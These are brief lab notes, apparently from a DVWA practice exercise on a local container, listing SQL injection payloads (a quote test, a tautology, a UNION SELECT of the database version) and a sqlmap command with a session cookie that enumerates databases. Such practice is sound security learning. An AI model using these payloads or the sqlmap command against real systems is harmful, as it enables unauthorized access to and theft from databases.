sql injection high vulnerability : --------------------------------------
1'

%' '0' = '0

%' '0' = '0' #

SELECT first_name, last_name FROM users WHERE user_id = '%' '0' = '0' #' LIMIT 1;

1 ' UNION SELECT null, version() #


using sqlmap : - 

sqlmap -u "http://172.17.0.2/vulnerabilities/sqli/?id=1" --cookie="PHPSESSID=lred0jr6na1vmci2o8160sb5ff; security=high" --dbs


